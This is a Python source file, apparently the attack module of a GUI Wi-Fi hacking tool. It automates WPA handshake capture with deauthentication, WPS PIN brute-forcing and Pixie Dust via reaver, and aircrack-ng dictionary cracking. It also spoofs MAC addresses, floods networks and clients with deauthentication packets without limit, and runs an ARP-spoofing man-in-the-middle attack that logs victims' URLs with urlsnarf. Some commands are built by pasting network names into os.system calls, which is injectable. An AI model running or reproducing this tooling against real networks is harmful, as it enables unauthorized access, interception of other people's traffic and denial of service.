import tools
import subprocess
import os 
import globs
import random as rd
import time
import re
from tkinter import DISABLED, NORMAL
from tkinter.filedialog import askopenfilename

# some gui operations when attack is launched
def attack_launched(tree, scan_btn, stop_attack_btn):
    scan_btn['state'] = DISABLED
    stop_attack_btn['state'] = NORMAL
    tree.state(("disabled",))
    tree.unbind("<Button-3>")
    globs.spoof_option['state'] = DISABLED
    globs.interface_list['state'] = DISABLED

def stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click):
    tree.state(("!disabled",))
    tree.bind("<Button-3>", tree_on_right_click)
    stop_attack_btn['state'] = DISABLED
    scan_btn['state'] = NORMAL
    globs.spoof_option['state'] = NORMAL
    globs.interface_list['state'] = NORMAL

# Spoofs mac
def spoof(interface):
    p = subprocess.Popen(('ifconfig ' + str(interface) + ' down').split(" "))
    p.wait()
    p = subprocess.Popen(('macchanger -r ' + str(interface)).split(" "))
    p.wait()
    p = subprocess.Popen(('ifconfig ' + str(interface) + ' up').split(" "))
    p.wait()
    return 0


# Handshake
def try_handshake(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click, passive=True):

    attack_launched(tree, scan_btn, stop_attack_btn)

    tools.addToolInfo(T, "Executing handshake operation...\n\n")
    monitor_interface = tools.enable_monitor(interface)
    tools.addToolInfo(T, str(interface) + " is now in monitor mode, at " + monitor_interface + "\n\n")

    # Spoof mac ?
    if globs.spoof_mac.get() == 1:
        spoof(monitor_interface)
        tools.addToolInfo(T, "Mac of " + monitor_interface + " is now spoofed to a random mac for this attack.\n")

    current_item = tree.item(tree.focus())

    # check that a wifi entry is selected
    if len(current_item['values']) == 0:
        tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        tools.disable_monitor(monitor_interface)
        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
        return 0

    mac, wifi_name, enc, channel = current_item['values'][3], current_item['values'][0], \
                current_item['values'][1], current_item['values'][5] 
    tools.addToolInfo(T, "Trying to capture handshake for " + str(wifi_name) + "...\n")

    # Listen using airodump-ng
    cwd = os.path.dirname(os.path.realpath(__file__)) 
    with open(str(wifi_name)+'_output', 'w') as out_file:
        # remove any old temp files
        try : os.system('rm ' + cwd + "/packets_" + str(wifi_name) + "*") 
        except: print("Nothing important...")

        airodump = subprocess.Popen(('airodump-ng -w packets_' + str(wifi_name) + ' --bssid ' + mac + \
                                    ' -c ' + str(channel) + ' ' + monitor_interface).split(" "), \
                                    stdout=out_file, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1, cwd=cwd)
    
    captured = False
    while not captured:
        root.update()
        if os.path.exists(cwd+"/" + str(wifi_name) + "_output"):
            with open(str(wifi_name) + "_output", "r") as f: 
                for line in f.readlines():
                    if 'Elapsed' in line: # line where we can see when handshake is captured
                        if 'WPA handshake' in line: # handshake captured

                            # first, sleep a few secs before terminating the process
                            # to make sure the full handshake has been captured and logged to the file
                            time.sleep(5)
                            # airodump.terminate()
                            airodump.kill()

                            # rename handshake captured to save it for later
                            os.system('mv ' + cwd + '/packets_' + str(wifi_name) +'-01.cap' + ' captured_'+str(wifi_name) + ".cap")
                            tools.addToolInfo(T, "Successfully captued handshake of " + str(wifi_name) + \
                                " !!!.\nCaptured file available at captured_" + str(wifi_name)+'.cap\n\n') 
                            captured = True
                            globs.stop_attack = False
                            break
                        elif globs.stop_attack: # user clicked stopped attack button
                            globs.stop_attack = False
                            # airodump.terminate()
                            airodump.kill()
                            tools.addToolInfo(T, "Stopped handshake operation.\n\n")
                            captured = True # not really :)
                            break


        # If not passive (active/just listening), try to de-auth and capture 
        if not passive and not captured:
            tools.addToolInfo(T, "Trying to de-authenticate " + str(wifi_name) + "...\n")
            # de-auth using aireplay
            times = rd.randint(3, 12) # random de-auth packets
            aireplay = subprocess.Popen(('aireplay-ng -0 ' + str(times) + ' -a ' + mac + ' ' + monitor_interface).split(" "), \
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1, cwd=cwd)

            root.update()
            if globs.stop_attack:
                globs.stop_attack = False
                # airodump.terminate()
                # aireplay.terminate()
                airodump.kill()
                aireplay.kill()
                tools.addToolInfo(T, "Stopped handshake operation.\n\n")
                captured = True # not really :)
                break

            aireplay.wait()
            tools.addToolInfo(T, "Sent " + str(times) + " de-auth packets. Listening, please wait...\n")
            t = rd.randint(2, 6) # sleep some random seconds
            time.sleep(t)

    tools.disable_monitor(monitor_interface)
    tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")

    stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)

    return 0

# wps attack (includes pixie dust)
def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click, pixie = False):

    attack_launched(tree, scan_btn, stop_attack_btn)

    tools.addToolInfo(T, "Executing WPS attack operation...\n\n")
    monitor_interface = tools.enable_monitor(interface)
    tools.addToolInfo(T, str(interface) + " is now in monitor mode, at " + monitor_interface + "\n\n")

    # Spoof mac ?
    if globs.spoof_mac.get() == 1:
        spoof(monitor_interface)
        tools.addToolInfo(T, "Mac of " + monitor_interface + " is now spoofed to a random mac for this attack.\n")

    current_item = tree.item(tree.focus())

    # TODO some bug, will fix later
    if len(current_item['values']) == 0:
        tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        tools.disable_monitor(monitor_interface)
        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
        return 0

    mac, wifi_name, enc, channel, wps = current_item['values'][3], current_item['values'][0], \
                current_item['values'][1], current_item['values'][5], current_item['values'][4] 

    if wps == '-' or "(l)" in wps:
        tools.addToolInfo(T, "Please choose a WiFi network with WPS enabled (give the tool its time to get this info) and not locked (nl)\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        tools.disable_monitor(monitor_interface)
        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
        return 0

    # Execute reaver
    if not pixie:
        tools.addToolInfo(T, "Executing WPS attack - PIN Brute Force...\n")
    else:
        tools.addToolInfo(T, "Executing WPS attack - Pixie Dust...\n")
    cwd = os.path.dirname(os.path.realpath(__file__)) 
    with open(str(wifi_name)+'_reaver_output', 'w') as out_file:
        pix_arg = ''
        if pixie:
            pix_arg = '-K'

        # check for old sessions - locations may depend on OS
        old_session = ''
        m = "".join(mac.split(":"))
        if os.path.exists('/usr/local/etc/reaver/' + m + '.wpc'):
            old_session = '-s /usr/local/etc/reaver/' + m + '.wpc'
        elif os.path.exists('/var/lib/reaver/' + m + '.wpc'):
            old_session = '-s /var/lib/reaver/' + m + '.wpc'

        reaver = subprocess.Popen(('reaver -i '+ monitor_interface + ' --bssid ' + mac + \
                                    ' -c ' + str(channel) + ' -vv -L -N -T .5 -r 3:15 -d 15 ' + old_session + ' ' + pix_arg).split(" "), \
                                    stdout=out_file, stderr=subprocess.STDOUT, stdin = subprocess.PIPE, \
                                        universal_newlines=True, bufsize=1, cwd=cwd)
        
    done = False
    tried = []; warned_limit = False; warned_timeout = False; failed = False; pixie_warn = False
    while not done:
        root.update()
        if os.path.exists(cwd+"/" + str(wifi_name) + "_reaver_output"):
            with open(str(wifi_name) + "_reaver_output", "r") as f: 

                # Handle reaver cases/errors
                for line in f.readlines():
                    
                    if not pixie:
                        # Pin being tried
                        if 'Trying pin' in line:
                            pin = line.split("\"")[-2]
                            if pin not in tried:
                                tried.append(pin)
                                tools.addToolInfo(T, "Trying now pin " + str(pin) + "\n")

                        # Router probably detected the attack
                        elif "WARNING: Detected AP rate limiting" in line and not warned_limit:
                            warned_limit = True # only warn user one time about router detecting attack
                            tools.addToolInfo(T, "Router may have detected pin attempts, it's limiting try rate.\n")
                            tools.addToolInfo(T, "Stop the attack manually if no new pins get tried in a while...\n")

                        elif ("WPS transaction failed (code: 0x02)" in line or "WARNING: Receive timeout occurred" in line) \
                                                        and not warned_timeout:
                            warned_timeout = True
                            tools.addToolInfo(T, "Failed to pass pin, try to get closer to target.\n")
                            tools.addToolInfo(T, "If no new pins get tried in a while, router may have locked WPS. \nStop the attack if you keep seeing this for more than 10 mins...\n")

                        elif "WARNING: 10 failed connections in a row" in line and not failed:
                            failed = True
                            tools.addToolInfo(T, "10 failed connections in a row... If you're close to target, router may have locked WPS. It's advised to stop the attack now.\n")

                    # Pixie attack case
                    else:

                        if ("Receive timeout occurred" in line or "WPS transaction failed" in line) and not pixie_warn:
                            pixie_warn = True
                            tools.addToolInfo(T, "Timeout when connecting to router.\nStop attack (or try re-launching attack) if you keep seeing this for more than 10 mins...\n")
                        elif "Pixiewps fail" in line:
                            tools.addToolInfo(T, "Pixie dust attack failed, nothing cracked.\n")
                            globs.stop_attack = False
                            done = True 
                            break

                    # Pin & pass found in these 2 cases
                    if "WPS PIN:" in line:
                        tools.addToolInfo(T, "Pin found - " + str(line) + "\n")
                    elif "WPA PSK:" in line:
                        tools.addToolInfo(T, "Password cracked - " + str(line) + "\n")
                        globs.stop_attack = False
                        done = True 
                        break

                    # This should not be the case
                    elif "Restore previous session" in line:
                        globs.stop_attack = False
                        # reaver.terminate()
                        reaver.kill()
                        tools.addToolInfo(T, "Something went wrong, WPS attack cannot be executed on this machine.\n\n")
                        done = True 
                        break
                    
                    # clicked stopped attack button
                    if globs.stop_attack: 
                        globs.stop_attack = False
                        # reaver.terminate()
                        reaver.kill()
                        tools.addToolInfo(T, "Stopped WPS attack operation.\n\n")
                        done = True 
                        break


    tools.disable_monitor(monitor_interface)
    tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")

    stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)

    return 0


def crack_wpa(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click):
    """
    Uses the captured handshake packets to find the WPA wifi password, using brute-force

    This is esentially a dictionary attack. The program reads a list of possible passwords, `passwords.lst`, 
    and tries each of the combinations until the correct one is found.
    """

    # command: aircrack-ng -w passwords.lst -b {mac_address} captured_{wifi_name}.cap > crack_wpa_output.txt

    cwd = os.path.dirname(os.path.realpath(__file__)) 

    current_item = tree.item(tree.focus())
    mac, wifi_name, enc, channel = current_item['values'][3], current_item['values'][0], \
                current_item['values'][1], current_item['values'][5] 

    # check before that we indeed have a handshake
    if not os.path.exists(f"./captured_{wifi_name}.cap"):
        tools.addToolInfo(T, f"No captured handshake found for network {wifi_name}. Please capture a handshake first.\n\n")
        return 0

    # get path of dictionary file
    dict_filename = askopenfilename(title="Select a dictionary file for this attack", initialfile="passwords.lst", \
                                    initialdir=cwd, filetypes=[("Dictionary files", "*.lst"), ("Text files", "*.txt")], \
                                    parent=root)

    # if user pressed "cancel" or "X"
    if not dict_filename:
        # dict_filename = "passwords.lst"
        tools.addToolInfo(T, "Operation canceled.\n\n")
        return 0

    # now go
    attack_launched(tree, scan_btn, stop_attack_btn)
    

    # check that a wifi entry is selected
    if len(current_item['values']) == 0:
        tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        return 0

    
    tools.addToolInfo(T, "Cracking password for network " + str(wifi_name) + "...\n\n")

    output_filename = f"crack_wpa_{wifi_name}.txt"

    with open(output_filename, "w+") as f_temp:
        aircrack = subprocess.Popen((f"aircrack-ng -w {dict_filename} -b {mac} captured_{wifi_name}.cap").split(" "), \
                            stdin = subprocess.PIPE, cwd=cwd, universal_newlines=True, bufsize=1, stdout=f_temp, stderr=f_temp)

    pwd_found = False
    write_progress(T, 0)
    while not pwd_found:
        with open(output_filename, "r+") as f:
            contents = f.readlines()

            for line in contents:
                if "KEY FOUND" in line:
                    idx_left = line.index("!") + 3
                    idx_right = line.index("]")
                    update_progress(T, 100.0)
                    tools.addToolInfo(T, "\nPassword found: " + line[idx_left:idx_right] + "\n\n")
                    # aircrack.terminate()
                    aircrack.kill()
                    pwd_found = True

                    # break from the inner loop, so that we stop reading the file
                    break

                # progress bar stuff
                if "%" in line:
                    # that's the progress percentage
                    percentages = re.findall("\d+\.\d+%", line)
                    if len(percentages) > 0:
                        progress = float(percentages[0][:-1])
                        # show percentage in some way
                        update_progress(T, progress)

        # User clicked stop attack
        if globs.stop_attack:
            globs.stop_attack = False
            # aircrack.terminate()
            aircrack.kill()
            pwd_found = True # not really
            tools.addToolInfo(T, "\nOperation canceled.\n\n")
            break

        time.sleep(0.5)

    # delete the log file, no more needed
    os.remove(output_filename)
    stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
    globs.stop_attack = False

    return 0

def write_progress(T, value):
    progress_str = "#" * int(value / 100.0 * 20.0)
    tools.addToolInfo(T, ("[%-20s]" % progress_str) + f"\t{value}%", "progress")

def update_progress(T, value):
    T.configure(state="normal")
    last_insert = T.tag_ranges("progress")
    T.delete(last_insert[0], last_insert[1])
    # T.delete("end-1c linestart", "end")
    write_progress(T, value)
    T.configure(state="disabled")


# DOS - dirty attack :) only for educational purposes :D
def dos(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click):
    
    attack_launched(tree, scan_btn, stop_attack_btn)

    tools.addToolInfo(T, "Executing DOS operation...\n\n")
    monitor_interface = tools.enable_monitor(interface)
    tools.addToolInfo(T, str(interface) + " is now in monitor mode, at " + monitor_interface + "\n\n")

    # Spoof mac ?
    if globs.spoof_mac.get() == 1:
        spoof(monitor_interface)
        tools.addToolInfo(T, "Mac of " + monitor_interface + " is now spoofed to a random mac for this attack.\n")

    current_item = tree.item(tree.focus())

    # TODO some bug, will fix later
    if len(current_item['values']) == 0:
        tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        tools.disable_monitor(monitor_interface)
        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
        return 0

    mac, wifi_name, channel = current_item['values'][3], current_item['values'][0], current_item['values'][5]

    # Airodump here is just a lazy way to set channel of device :D
    airodump = subprocess.Popen(('airodump-ng --bssid ' + mac + ' -c ' + str(channel) + ' ' + monitor_interface).split(" "))
    time.sleep(2)
    airodump.kill()
    aireplay = subprocess.Popen(('aireplay-ng -0 0 -a ' + mac + ' ' + monitor_interface).split(" "))
    
    tools.addToolInfo(T, "Sending unlimited de-authentications to " + str(wifi_name) + "...\n")
            
    stopped = False
    while not stopped:
        root.update()
        # clicked stopped attack button
        if globs.stop_attack: 
            globs.stop_attack = False
            aireplay.kill()
            airodump.kill()
            tools.addToolInfo(T, "Stopped DOS attack.\n\n")
            stopped = True 
            break

    tools.disable_monitor(monitor_interface)
    tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")

    stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)


def deauth_client(dev_mac_address, ap_mac_address, channel, root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click):
    
    attack_launched(tree, scan_btn, stop_attack_btn)

    tools.addToolInfo(T, "Executing De-auth operation...\n\n")
    monitor_interface = tools.enable_monitor(interface)
    tools.addToolInfo(T, str(interface) + " is now in monitor mode, at " + monitor_interface + "\n\n")

    # Spoof mac ?
    if globs.spoof_mac.get() == 1:
        spoof(monitor_interface)
        tools.addToolInfo(T, "Mac of " + monitor_interface + " is now spoofed to a random mac for this attack.\n")

    current_item = tree.item(tree.focus())

    # TODO some bug, will fix later
    if len(current_item['values']) == 0:
        tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        tools.disable_monitor(monitor_interface)
        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
        return 0


    # Airodump here is just a lazy way to set channel of device :D
    airodump = subprocess.Popen(('airodump-ng --bssid ' + ap_mac_address + ' -c ' + str(channel) + ' ' + monitor_interface).split(" "))
    time.sleep(2)
    airodump.kill()
    aireplay = subprocess.Popen((f'aireplay-ng -0 0 -a {ap_mac_address} -c {dev_mac_address} {monitor_interface}').split(" "))
            
    tools.addToolInfo(T, "Sending unlimited de-authentications to client...\n")
            
    stopped = False
    while not stopped:
        root.update()
        # clicked stopped attack button
        if globs.stop_attack: 
            globs.stop_attack = False
            aireplay.kill()
            airodump.kill()
            tools.addToolInfo(T, "Stopped DOS attack.\n\n")
            stopped = True 
            break

    tools.disable_monitor(monitor_interface)
    tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")

    stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)


def arpspoof(dev_mac_address, ap_mac_address, channel, root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click):

    # the selected entry in the devices treeview
    sel_item = tree.item(tree.focus())

    # FIRST, check if attacker is connected to same wifi network as victim
    try:
        attacker_wifi_mac = subprocess.check_output(["iwgetid -ar"], stderr=subprocess.STDOUT, shell=True).decode('utf-8')
        victim_wifi_mac = sel_item["values"][3] if len(sel_item["values"]) > 3 else None

        if attacker_wifi_mac != victim_wifi_mac:
            tools.addToolInfo(T, "Please connect to the same Wi-Fi network as the target device first.")
            return

    except:
        # most probably monitor mode has just been called, needs a few secs before wifi interface is available again
        tools.addToolInfo(T, "Could not get Wi-Fi mac address. Make sure your Wi-Fi interface is up, then try again.")
        return

    # update the UI to show that the attack started
    attack_launched(tree, scan_btn, stop_attack_btn)

    # getting client IP address:
    # a- if already found before, it should be listed in the selected item, column 6
    if len(sel_item["values"]) > 5 and sel_item["values"][5] and sel_item["values"][5] != "-":
        target_ip = sel_item["values"][5]

    # b- otherwise, get the taget's IP address (active method)
    else:
        tools.addToolInfo(T, "Getting the required IP addresses...\n\n")
        target_ip = tools.get_client_ip(dev_mac_address, T, tree, interface)

    # c- in case the first execution fails, keep trying
    while not target_ip:
        tools.addToolInfo(T, "Failed to find the client's IP. Trying again...\n\n")
        target_ip = tools.get_client_ip(dev_mac_address, T, tree, interface)
    
    attacker_ip = tools.get_local_ip()
    router_ip = tools.get_router_ip()

    # start arpspoofing
    try:
        tools.addToolInfo(T, "Launching arpspoof from victim to router...\n\n")
        arpspoof1 = subprocess.Popen([f"arpspoof -i {interface} -t {target_ip} {router_ip}"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(1)

        tools.addToolInfo(T, "Launching arpspoof from router to victim...\n\n")
        arpspoof2 = subprocess.Popen([f"arpspoof -i {interface} -t {router_ip} {target_ip}"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(1)

        # turn on packet forwarding
        subprocess.getoutput("sysctl -w net.ipv4.ip_forward=1")

        tools.addToolInfo(T, "Arpspoof launched.")


        # current dir
        cwd = os.path.dirname(os.path.realpath(__file__))

        # path of output csv file
        out_path = os.path.join(cwd, "temp_urlsnarf.txt")
        if os.path.exists(out_path):
            os.remove(out_path)

        # running urlsnarf
        urlsnarf = None
        
        with open(out_path, "w") as f:
            urlsnarf = subprocess.Popen([f"urlsnarf -i {interface}"], shell=True, stdout=f, stderr=subprocess.STDOUT)

        write_output(T, "", tag="urlsnarf")

        # keep the attack running until user presses "Stop Attack"
        # and update screen with new output every 1 sec
        while True:

            with open(out_path, "r") as f:
                output = f.read()
                # do something with output
                update_output(T, output + "\n", tag="urlsnarf")

            # when user clicks "Stop Attack"
            if globs.stop_attack:
                globs.stop_attack = False

                # kill the running processes
                arpspoof1.kill()
                arpspoof2.kill()
                urlsnarf.kill()
                
                # turn off packet forwarding
                subprocess.getoutput("sysctl -w net.ipv4.ip_forward=0")

                tools.addToolInfo(T, "Stopped ARP Spoof MITM attack.\n\n")
                stopped = True 
                break
        
            time.sleep(1)

    except Exception as e:
        print(e)
        tools.addToolInfo(T, "Something went wrong. Please try again.")

        if arpspoof1:
            arpspoof1.kill()

        if arpspoof2:
            arpspoof2.kill()

        if urlsnarf:
            urlsnarf.kill()
        
        # turn off packet forwarding
        subprocess.getoutput("sysctl -w net.ipv4.ip_forward=0")

        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        
        return
    
    finally:
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)


def write_output(T, msg, tag="output"):
    tools.addToolInfo(T, msg, tag)

def update_output(T, msg, tag="output"):
    T.configure(state="normal")
    last_insert = T.tag_ranges(tag)
    if len(last_insert) > 0:
        T.delete(last_insert[0], last_insert[1])
    # T.delete("end-1c linestart", "end")
    write_output(T, msg, tag)
    T.configure(state="disabled")